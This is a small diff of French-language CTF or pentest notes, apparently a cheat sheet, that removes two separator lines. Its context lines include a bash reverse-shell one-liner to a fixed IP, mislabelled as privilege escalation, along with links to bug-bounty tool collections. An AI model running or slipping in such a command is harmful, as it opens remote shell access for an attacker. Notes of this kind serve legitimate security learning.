@@ -23,8 +23,6 @@
 
 - `bash -i >& /dev/tcp/10.8.218.133/80 0>&1` --> Elévation de privilèges
 
----
-
 ### Tools
 
 - [BugBountyTool](https://github.com/vavkamil/awesome-bugbounty-tools) (regroupe les tools CTF)
@@ -33,7 +31,6 @@
 
 - Biblothèque cyber --> https://inventory.raw.pm/tools.html#title-tools-threat-intelligence
 
----
 
 ### Payload
 
